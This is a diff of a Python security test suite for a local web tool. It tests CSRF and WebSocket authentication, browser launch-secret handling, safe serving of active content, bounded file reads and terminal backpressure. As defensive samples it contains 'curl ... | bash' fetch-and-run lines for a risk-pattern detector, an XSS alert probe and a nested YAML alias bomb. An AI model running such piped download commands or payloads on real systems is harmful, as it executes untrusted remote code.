@@ -32,6 +32,7 @@ from benchtop import (
     fleet,
     fs_policy,
     git_ops,
+    pipelines,
     provenance,
     runplan,
     security,
@@ -56,6 +57,28 @@ async def _inert_asgi_app(scope: dict, receive, send) -> None:
         }
     )
     await send({"type": "http.response.body", "body": b'{"ok":true}'})
+
+
+_REAL_START_CONTROL_SERVER = cli._start_control_server
+_CONTROL_PATCH = None
+
+
+def setUpModule() -> None:
+    """Launcher tests must never create or remove a socket in real state."""
+    global _CONTROL_PATCH
+
+    async def no_control_server(state_dir, base_url):
+        return None
+
+    _CONTROL_PATCH = mock.patch.object(
+        cli, "_start_control_server", new=no_control_server
+    )
+    _CONTROL_PATCH.start()
+
+
+def tearDownModule() -> None:
+    if _CONTROL_PATCH is not None:
+        _CONTROL_PATCH.stop()
 
 
 def _http_request(
@@ -129,6 +152,7 @@ def _websocket_messages(
     host: str = "127.0.0.1:8787",
     origin: str = "http://127.0.0.1:8787",
     cookie: str = "",
+    subprotocols: list[str] | None = None,
 ) -> list[dict]:
     headers = [
         (b"host", host.encode("latin-1")),
@@ -145,7 +169,7 @@ def _websocket_messages(
         "headers": headers,
         "server": ("127.0.0.1", 8787),
         "client": ("127.0.0.1", 12345),
-        "subprotocols": [],
+        "subprotocols": list(subprotocols or []),
     }
     messages: list[dict] = []
 
@@ -216,29 +240,43 @@ class AuthenticationSecurityTests(unittest.TestCase):
                 )
                 self.assertEqual(status, expected)
 
-    def test_all_authenticated_api_requests_require_csrf_except_session_recovery(
-        self,
-    ) -> None:
+    def test_every_authenticated_api_request_requires_the_page_secret(self) -> None:
         status, _, _ = _http_request(self.middleware, cookie=self.cookie)
         self.assertEqual(status, 403)
         status, _, _ = _http_request(
             self.middleware, cookie=self.cookie, csrf=self.session.csrf
         )
         self.assertEqual(status, 200)
-        status, _, _ = _http_request(
+
+    def test_cookie_alone_cannot_obtain_the_page_secret(self) -> None:
+        # Browsers send the cookie to every port on the loopback host, so a
+        # cookie captured by another local service must be worthless alone.
+        status, _, body = _http_request(
             self.middleware,
             path="/api/auth/session",
             cookie=self.cookie,
         )
+        self.assertEqual(status, 403)
+        self.assertNotIn(self.session.csrf.encode(), body)
+        status, _, _ = _http_request(
+            self.middleware,
+            path="/api/auth/session",
+            cookie=self.cookie,
+            csrf=self.session.csrf,
+        )
         self.assertEqual(status, 200)
 
         request = SimpleNamespace(state=SimpleNamespace(benchtop_session=self.session))
-        recovered = server.recover_browser_session(request)
-        self.assertEqual(recovered["csrf"], self.session.csrf)
-        self.assertNotIn(self.session.token, json.dumps(recovered))
+        checked = server.check_browser_session(request)
+        self.assertNotIn(self.session.csrf, json.dumps(checked))
+        self.assertNotIn(self.session.token, json.dumps(checked))
 
     def test_unauthenticated_and_cross_origin_websockets_are_rejected(self) -> None:
-        unauthenticated = _websocket_messages(self.middleware)
+        offered = [
+            security.WS_SUBPROTOCOL,
+            security.WS_SECRET_PREFIX + self.session.csrf,
+        ]
+        unauthenticated = _websocket_messages(self.middleware, subprotocols=offered)
         self.assertEqual(unauthenticated[0]["type"], "websocket.close")
         self.assertEqual(unauthenticated[0]["code"], 4401)
 
@@ -246,12 +284,31 @@ class AuthenticationSecurityTests(unittest.TestCase):
             self.middleware,
             cookie=self.cookie,
             origin="http://evil.example",
+            subprotocols=offered,
         )
         self.assertEqual(cross_origin[0]["type"], "websocket.close")
         self.assertEqual(cross_origin[0]["code"], 4403)
 
-        accepted = _websocket_messages(self.middleware, cookie=self.cookie)
+        accepted = _websocket_messages(
+            self.middleware, cookie=self.cookie, subprotocols=offered
+        )
         self.assertEqual(accepted[0]["type"], "websocket.accept")
+
+    def test_websocket_requires_the_page_secret_as_well_as_the_cookie(self) -> None:
+        for offered in (
+            [],
+            [security.WS_SUBPROTOCOL],
+            [security.WS_SECRET_PREFIX + self.session.csrf],
+            [security.WS_SUBPROTOCOL, security.WS_SECRET_PREFIX],
+            [security.WS_SUBPROTOCOL, security.WS_SECRET_PREFIX + "wrong"],
+            [security.WS_SUBPROTOCOL, security.WS_SECRET_PREFIX + self.session.token],
+        ):
+            with self.subTest(offered=offered):
+                messages = _websocket_messages(
+                    self.middleware, cookie=self.cookie, subprotocols=offered
+                )
+                self.assertEqual(messages[0]["type"], "websocket.close")
+                self.assertEqual(messages[0]["code"], 4403)
 
     def test_oversized_request_is_rejected_before_dispatch(self) -> None:
         status, _, _ = _http_request(
@@ -337,26 +394,51 @@ class AuthenticationSecurityTests(unittest.TestCase):
         self.assertNotIn(capability, stdout.getvalue())
         self.assertNotIn(capability, stderr.getvalue())
 
-    def test_cli_delivers_capability_directly_to_browser_or_tty(self) -> None:
+    def test_cli_delivers_capability_only_to_the_controlling_terminal(self) -> None:
         url = "http://127.0.0.1:8787/#bootstrap=secret"
-        with mock.patch.object(cli, "_open_browser", return_value=True) as browser:
+        with (
+            mock.patch.object(cli, "_write_launch_url_to_tty") as terminal,
+            mock.patch.object(cli, "_open_browser", return_value=True) as browser,
+        ):
             self.assertEqual(cli._deliver_launch_url(url, no_browser=False), "browser")
-        browser.assert_called_once_with(url)
+        terminal.assert_called_once_with(url)
+        # The browser is only ever given the bare address.
+        browser.assert_called_once_with("http://127.0.0.1:8787/")
 
-        with mock.patch.object(cli, "_write_launch_url_to_tty") as terminal:
+        with (
+            mock.patch.object(cli, "_write_launch_url_to_tty") as terminal,
+            mock.patch.object(cli, "_open_browser") as browser,
+        ):
             self.assertEqual(cli._deliver_launch_url(url, no_browser=True), "terminal")
         terminal.assert_called_once_with(url)
+        browser.assert_not_called()
+
+    def test_cli_browser_opener_refuses_anything_that_could_carry_a_secret(
+        self,
+    ) -> None:
+        # Command-line arguments are world-readable through /proc.
+        for url in (
+            "http://127.0.0.1:8787/#bootstrap=secret",
+            "http://127.0.0.1:8787/?token=secret",
+            "http://user:secret@127.0.0.1:8787/",
+            "file:///tmp/launch.html",
+        ):
+            with (
+                self.subTest(url=url),
+                mock.patch.object(cli.subprocess, "Popen") as run,
+            ):
+                with self.assertRaises(ValueError):
+                    cli._open_browser(url, commands=(("/bin/true",),))
+                run.assert_not_called()
 
     def test_cli_browser_opener_is_fixed_silent_and_ignores_browser_env(self) -> None:
-        capability = "browser-capability-" + "r" * 48
-        url = f"http://127.0.0.1:8787/#bootstrap={capability}"
+        url = "http://127.0.0.1:8787/"
         with (
             mock.patch.dict(os.environ, {"BROWSER": "echo %s"}),
             mock.patch.object(cli.subprocess, "Popen") as launch,
         ):
             launch.return_value.wait.return_value = 0
             self.assertTrue(cli._open_browser(url, commands=(("/bin/true",),)))
-
         args, kwargs = launch.call_args
         self.assertEqual(args[0], ["/bin/true", url])
         self.assertNotIn("BROWSER", kwargs["env"])
@@ -364,34 +446,82 @@ class AuthenticationSecurityTests(unittest.TestCase):
         self.assertIs(kwargs["stdin"], cli.subprocess.DEVNULL)
         self.assertIs(kwargs["stdout"], cli.subprocess.DEVNULL)
         self.assertIs(kwargs["stderr"], cli.subprocess.DEVNULL)
-        self.assertTrue(kwargs["close_fds"])
         self.assertTrue(kwargs["start_new_session"])
-        launch.return_value.wait.assert_called_once_with(timeout=2.0)
 
-    def test_cli_real_opener_child_cannot_echo_capability_to_service_streams(
-        self,
-    ) -> None:
-        capability = "real-child-capability-" + "e" * 48
-        url = f"http://127.0.0.1:8787/#bootstrap={capability}"
-        stdout = io.StringIO()
-        stderr = io.StringIO()
-        with (
-            mock.patch.dict(os.environ, {"BROWSER": "echo %s"}),
-            contextlib.redirect_stdout(stdout),
-            contextlib.redirect_stderr(stderr),
+    def test_issued_launch_codes_are_single_use_and_expire(self) -> None:
+        state = security.AuthState()
+        first = state.exchange(state.bootstrap_token)
+        self.assertIsNotNone(first)
+        code = state.issue_launch_code()
+        second = state.exchange(code)
+        self.assertIsNotNone(second)
+        self.assertNotEqual(first.token, second.token)
+        self.assertIsNone(state.exchange(code))
+        # Both sessions stay valid: a second tab does not sign the first out.
+        self.assertIsNotNone(state.session(first.token))
+        expired = state.issue_launch_code()
+        with mock.patch.object(
+            security.time,
+            "time",
+            return_value=time.time() + security.LAUNCH_CODE_TTL_SECONDS + 1,
         ):
-            self.assertTrue(cli._open_browser(url, commands=(("/bin/echo",),)))
-        self.assertNotIn(capability, stdout.getvalue())
-        self.assertNotIn(capability, stderr.getvalue())
+            self.assertIsNone(state.exchange(expired))
+        for _ in range(security.MAX_PENDING_LAUNCH_CODES + 3):
+            state.issue_launch_code()
+        self.assertLessEqual(len(state._issued), security.MAX_PENDING_LAUNCH_CODES)
+        self.assertIsNone(state.exchange(""))
 
-    def test_cli_failed_browser_opener_falls_back_without_stream_echo(self) -> None:
-        url = "http://127.0.0.1:8787/#bootstrap=fallback-secret"
-        with (
-            mock.patch.object(cli, "_open_browser", return_value=False),
-            mock.patch.object(cli, "_write_launch_url_to_tty") as terminal,
-        ):
-            self.assertEqual(cli._deliver_launch_url(url, no_browser=False), "terminal")
-        terminal.assert_called_once_with(url)
+    def test_control_socket_issues_launch_urls_to_this_account_only(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            state_dir = Path(tmp)
+            state = security.AuthState()
+
+            async def scenario() -> tuple[str, int]:
+                with mock.patch.object(security, "AUTH_STATE", state):
+                    server = await _REAL_START_CONTROL_SERVER(
+                        state_dir, "http://127.0.0.1:8787/"
+                    )
+                    self.assertIsNotNone(server)
+                    mode = os.stat(cli._control_socket_path(state_dir)).st_mode & 0o777
+                    try:
+                        url = await asyncio.to_thread(
+                            cli._request_launch_url, state_dir
+                        )
+                    finally:
+                        server.close()
+                        await server.wait_closed()
+                    return url, mode
+
+            url, mode = asyncio.run(scenario())
+            self.assertEqual(mode, 0o600)
+            base, _, code = url.partition("#bootstrap=")
+            self.assertEqual(base, "http://127.0.0.1:8787/")
+            self.assertIsNotNone(state.exchange(code))
+
+            async def refused() -> str:
+                with (
+                    mock.patch.object(security, "AUTH_STATE", state),
+                    mock.patch.object(cli, "_peer_is_this_user", return_value=False),
+                ):
+                    server = await _REAL_START_CONTROL_SERVER(
+                        state_dir, "http://127.0.0.1:8787/"
+                    )
+                    try:
+                        await asyncio.to_thread(cli._request_launch_url, state_dir)
+                    except SystemExit as exc:
+                        return str(exc)
+                    finally:
+                        server.close()
+                        await server.wait_closed()
+                    return ""
+
+            self.assertIn("refused", asyncio.run(refused()))
+
+    def test_open_command_without_a_running_server_fails_cleanly(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            with self.assertRaises(SystemExit) as raised:
+                cli._request_launch_url(Path(tmp))
+            self.assertIn("no running OmicsANG", str(raised.exception))
 
     def test_cli_refuses_insecure_no_tty_fallback_without_echoing_token(
         self,
@@ -561,6 +691,8 @@ class AuthenticationSecurityTests(unittest.TestCase):
         create.assert_called_once_with(
             family=cli.socket.AF_INET,
             type=cli.socket.SOCK_STREAM,
+            # asyncio enables TCP_NODELAY only when the protocol is explicit.
+            proto=cli.socket.IPPROTO_TCP,
         )
         listener.bind.assert_called_once_with(("127.0.0.1", 8787))
         listener.set_inheritable.assert_called_once_with(False)
@@ -1169,6 +1301,57 @@ class ActiveContentSecurityTests(unittest.TestCase):
                         "application/octet-stream",
                     )
 
+    def test_no_guessed_document_media_type_is_served_inline(self) -> None:
+        # Which of these suffixes map to a document type depends on the host
+        # mimetypes database, so assert the invariant rather than the mapping.
+        names = [
+            "summary.shtml",
+            "report.xht",
+            "figure.svgz",
+            "feed.atom",
+            "formula.mml",
+            "track.kml",
+            "page.mht",
+            "REPORT.HTML",
+        ]
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            for name in names:
+                with self.subTest(name=name):
+                    path = root / name
+                    path.write_text("<script>alert(1)</script>", encoding="utf-8")
+                    response = server._authorized_file_response(path)
+                    content_type = response.headers.get("content-type", "").lower()
+                    for marker in ("html", "xml", "svg", "rfc822", "multipart"):
+                        self.assertNotIn(marker, content_type)
+
+    def test_guessed_active_media_type_forces_attachment(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            path = Path(tmp) / "summary.shtml"
+            path.write_text("<script>alert(1)</script>", encoding="utf-8")
+            with mock.patch.object(
+                server.mimetypes, "guess_type", return_value=("text/html", None)
+            ):
+                self.assertTrue(server._is_active_content(path))
+                response = server._authorized_file_response(path)
+            self.assertEqual(response.media_type, "application/octet-stream")
+            self.assertTrue(
+                response.headers.get("content-disposition", "")
+                .lower()
+                .startswith("attachment;")
+            )
+
+    def test_passive_result_files_stay_inline(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            for name in ("plot.png", "report.pdf", "table.tsv", "run.log", "notes.txt"):
+                with self.subTest(name=name):
+                    path = root / name
+                    path.write_bytes(b"data")
+                    self.assertFalse(server._is_active_content(path))
+                    response = server._authorized_file_response(path)
+                    self.assertNotIn("content-disposition", response.headers)
+
 
 class GitSafetyTests(unittest.TestCase):
     @staticmethod
@@ -1296,3 +1479,155 @@ class GitSafetyTests(unittest.TestCase):
 
 if __name__ == "__main__":  # pragma: no cover
     unittest.main()
+
+
+class RepositoryFileReadBoundTests(unittest.TestCase):
+    """A checkout cannot make discovery read a device or an enormous file."""
+
+    def test_device_fifo_and_oversized_files_are_refused(self) -> None:
+        from benchtop import yaml_io
+
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            device = root / "environment.yml"
+            device.symlink_to("/dev/zero")
+            with self.assertRaises(OSError):
+                yaml_io.read_text(device)
+            fifo = root / "fifo.yml"
+            os.mkfifo(fifo)
+            with self.assertRaises(OSError):
+                yaml_io.read_text(fifo)
+            large = root / "large.yml"
+            large.write_bytes(b"a" * 65)
+            with self.assertRaises(OSError):
+                yaml_io.read_text(large, limit=64)
+            small = root / "small.yml"
+            small.write_text("name: demo\n", encoding="utf-8")
+            self.assertEqual(
+                yaml_io.display_load(yaml_io.read_text(small)), {"name": "demo"}
+            )
+
+    def test_discovery_survives_an_endless_environment_file(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            repo = Path(tmp) / "demo"
+            repo.mkdir()
+            (repo / "environment.yml").symlink_to("/dev/zero")
+            self.assertIsNone(pipelines._conda_env_name(repo / "environment.yml"))
+            self.assertFalse(
+                pipelines._env_mentions_snakemake(repo / "environment.yml")
+            )
+
+
+class DiagnosticsScanBoundTests(unittest.TestCase):
+    def test_yaml_alias_expansion_is_bounded(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            config = root / "config.yaml"
+            lines = ["a0: &a0 [" + ", ".join(['"/missing/x.txt"'] * 8) + "]"]
+            for level in range(1, 12):
+                lines.append(
+                    f"a{level}: &a{level} [" + ", ".join([f"*a{level - 1}"] * 8) + "]"
+                )
+            config.write_text("\n".join(lines) + "\n", encoding="utf-8")
+            items: list[dict] = []
+            server._scan_yaml_paths(root, config, "config.yaml", items)
+            self.assertLessEqual(len(items), server.YAML_SCAN_ITEM_LIMIT)
+
+    def test_download_pipe_pattern_is_linear_on_long_lines(self) -> None:
+        pattern = server.SHELL_RISK_PATTERNS[1][0]
+        self.assertTrue(
+            pattern.search("curl -fsSL https://example.invalid/i.sh | bash")
+        )
+        self.assertTrue(pattern.search("wget -qO- u | tee log | sh"))
+        started = time.monotonic()
+        self.assertIsNone(pattern.search("curl " * 100_000))
+        self.assertLess(time.monotonic() - started, 5.0)
+
+
+class TerminalBackpressureTests(unittest.TestCase):
+    """A slow terminal client is repainted, never shown output with a hole."""
+
+    def _session(self) -> Session:
+        return Session(kind="shell", title="t", cwd="/", argv=["/bin/true"])
+
+    def test_overflow_requests_a_repaint_instead_of_dropping_output(self) -> None:
+        from benchtop import sessions as sessions_module
+
+        session = self._session()
+        queue, _ = session.subscribe()
+        limit = sessions_module._SUBSCRIBER_QUEUE_ITEMS
+        for index in range(limit + 5):
+            session._append(f"line {index}\n".encode())
+        self.assertGreaterEqual(session.resyncs, 1)
+        first = queue.get_nowait()
+        self.assertIs(first, sessions_module.RESYNC)
+        snapshot = session.resync_snapshot(queue)
+        self.assertTrue(queue.empty())
+        for index in range(limit + 5):
+            self.assertIn(f"line {index}\n".encode(), snapshot)
+        session._append(b"after\n")
+        self.assertEqual(queue.get_nowait(), b"after\n")
+
+    def test_repaint_request_keeps_the_end_of_stream_marker(self) -> None:
+        from benchtop import sessions as sessions_module
+
+        session = self._session()
+        queue, _ = session.subscribe()
+        queue.put_nowait(b"tail")
+        queue.put_nowait(EOF)
+        session._request_resync(queue)
+        self.assertIs(queue.get_nowait(), sessions_module.RESYNC)
+        queue.put_nowait(b"late")
+        session.resync_snapshot(queue)
+        self.assertIs(queue.get_nowait(), EOF)
+        self.assertTrue(queue.empty())
+
+
+class BufferedBodyReplayTests(unittest.TestCase):
+    def test_second_receive_waits_for_the_real_disconnect(self) -> None:
+        """A POST that answers with a file must not see a phantom disconnect."""
+        state = security.AuthState()
+        session = state.exchange(state.bootstrap_token)
+        observed: list[str] = []
+
+        async def downstream(scope, receive, send) -> None:
+            observed.append((await receive())["type"])
+            pending = asyncio.ensure_future(receive())
+            await asyncio.sleep(0.05)
+            observed.append("pending" if not pending.done() else "resolved")
+            pending.cancel()
+            await send({"type": "http.response.start", "status": 200, "headers": []})
+            await send({"type": "http.response.body", "body": b"ok"})
+
+        middleware = security.SecurityMiddleware(downstream, state)
+        sent = False
+
+        async def receive() -> dict:
+            nonlocal sent
+            if not sent:
+                sent = True
+                return {"type": "http.request", "body": b"{}", "more_body": False}
+            await asyncio.sleep(3600)
+            return {"type": "http.disconnect"}
+
+        async def send(message: dict) -> None:
+            return None
+
+        scope = {
+            "type": "http",
+            "method": "POST",
+            "scheme": "http",
+            "path": "/api/example",
+            "raw_path": b"/api/example",
+            "query_string": b"",
+            "server": ("127.0.0.1", 8787),
+            "client": ("127.0.0.1", 12345),
+            "headers": [
+                (b"host", b"127.0.0.1:8787"),
+                (b"origin", b"http://127.0.0.1:8787"),
+                (b"cookie", f"{security.AUTH_COOKIE}={session.token}".encode()),
+                (security.CSRF_HEADER.encode(), session.csrf.encode()),
+            ],
+        }
+        asyncio.run(middleware(scope, receive, send))
+        self.assertEqual(observed, ["http.request", "pending"])
